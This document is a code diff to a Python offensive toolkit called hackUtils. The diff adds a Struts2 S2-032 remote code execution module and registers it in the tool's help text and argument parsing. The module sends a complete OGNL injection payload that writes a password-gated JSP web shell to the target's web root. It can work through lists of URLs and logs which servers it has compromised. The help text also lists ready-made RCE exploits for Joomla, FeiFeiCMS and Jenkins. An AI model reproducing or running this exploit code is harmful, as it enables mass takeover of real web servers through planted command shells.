@@ -733,10 +733,57 @@ def getJenkinsVersion(html):
             return ""
     except Exception:
         return ""
+
+def rceStruts2S2032(value):
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Checking Struts2 (S2-032) Remote Code Execution..."
+    if 'http://' in value or 'https://' in value:
+    	url=value
+    	checkS2032(url)
+    else:
+    	urlfile=open(value,'r')
+    	for url in urlfile:
+            if url.strip():
+                checkS2032(url)
+    	urlfile.close()
+    output = os.path.dirname(os.path.realpath(__file__))+"/s2032_rce.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Scanned Vuls:"
+        print "[*] Output File: "+output
+
+def checkS2032(url):    
+    url = url.strip()
+    #reg = 'http[s]*://.*/$'
+    #m = re.match(reg,url)
+    #if not m:
+    #    url = url + "/"
+    shellname="nimabi.jsp"
+    shellpwd="pwd"
+    exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj="+shellname+"&content=gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.getParameter%28%22"+shellpwd+"%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22l%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E"
+    try:
+        result = exploitS2032(exp)
+        if shellname in result:
+            document_root = result.strip()
+            reg = '(http[s]*://[^/]*/?).*$'
+            m = re.search(reg,url)
+            if m:
+                url=m.group(1)
+            shell_file = url+shellname
+            vuls='[+] vuls found! url: '+url+', document_root: '+document_root+', shell_file: '+shell_file
+            logfile(vuls,'s2032_rce.txt')
+            print vuls
+        else:
+            print '[!] no vuls! url: '+url
+    except Exception,e:
+        print '[!] connection failed! url: '+url
+
+def exploitS2032(exp):
+    response = requests.get(exp, timeout=10) 
+    return response.content
     
 def myhelp():
     print "\n+-----------------------------+"
-    print "|  hackUtils v0.0.8           |"
+    print "|  hackUtils v0.0.9           |"
     print "|  Avfisher - avfisher.win    |"
     print "|  security_alert@126.com     |"
     print "+-----------------------------+\n"
@@ -752,6 +799,7 @@ def myhelp():
     print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
     print "  -f url|file, --ffcms=url|file                       Exploit Remote Code Execution for FeiFeiCMS 2.8 (Password: 1)"
     print "  -k ip|file[::cmd], --jenkins=ip|file[::cmd]         Exploit Remote Code Execution for XStream (Jenkins CVE-2016-0792)"
+    print "  -s url|file, --s2032=url|file                       Exploit Remote Code Execution for Struts2 (S2-032) (Password: pwd)"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
@@ -770,13 +818,15 @@ def myhelp():
     print "  hackUtils.py -k 10.10.10.10::dir"
     print "  hackUtils.py -k ips.txt"
     print "  hackUtils.py -k ips.txt::\"touch /tmp/jenkins\""
+    print "  hackUtils.py -s http://www.struts2.com/"
+    print "  hackUtils.py -s urls.txt"
     print "  hackUtils.py -d example.com"
     print "  hackUtils.py -e text"
     print "\n[!] to see help message of options run with '-h'"
 
 def main():
     try:
-        options,args = getopt.getopt(sys.argv[1:],"hb:g:i:u:w:j:r:f:k:d:e:",["help","baidu=","google=","censysid=","censysurl=","wooyun=","joomla=","rce=","ffcms=","jenkins=","domain=","encrypt="])
+        options,args = getopt.getopt(sys.argv[1:],"hb:g:i:u:w:j:r:f:k:s:d:e:",["help","baidu=","google=","censysid=","censysurl=","wooyun=","joomla=","rce=","ffcms=","jenkins=","s2032=","domain=","encrypt="])
     except getopt.GetoptError:
         print "\n[WARNING] error, to see help message of options run with '-h'"
         sys.exit()
@@ -802,6 +852,8 @@ def main():
             rceFeiFeiCMS(value)
         if name in ("-k","--jenkins"):
             rceXStreamJenkins(value)
+        if name in ("-s","--s2032"):
+            rceStruts2S2032(value)
         if name in ("-d","--domain"):
             scanSubDomains('baidu',value,50)
         if name in ("-e","--encrypt"):
